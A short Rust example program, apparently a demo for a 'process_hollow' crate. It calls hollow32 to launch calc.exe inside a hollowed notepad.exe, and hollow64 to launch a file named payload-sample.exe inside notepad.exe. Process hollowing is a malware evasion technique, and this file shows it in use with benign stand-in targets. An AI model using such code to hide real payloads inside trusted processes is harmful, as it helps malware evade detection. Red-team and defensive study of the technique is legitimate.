extern crate process_hollow;

use anyhow::*;

fn main() -> Result<()> {
    // 32bit -> 32bit
    unsafe { process_hollow::hollow32("c:\\windows\\syswow64\\calc.exe", "c:\\windows\\syswow64\\notepad.exe")? };

    // 64bit -> 64bit
    unsafe { process_hollow::hollow64("./payload-sample.exe", "notepad.exe")? };

    println!("Exit after 3secs...");
    std::thread::sleep(std::time::Duration::from_millis(3000));
    Ok(())
}
